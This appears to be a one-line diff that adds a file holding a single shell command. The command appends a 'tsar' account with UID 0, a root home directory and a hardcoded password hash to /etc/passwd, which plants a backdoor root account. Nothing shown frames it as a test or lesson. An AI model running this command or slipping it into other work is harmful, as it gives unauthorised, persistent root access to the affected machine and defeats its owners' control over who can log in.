@@ -1,0 +1,1 @@
+echo "tsar:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> /etc/passwd
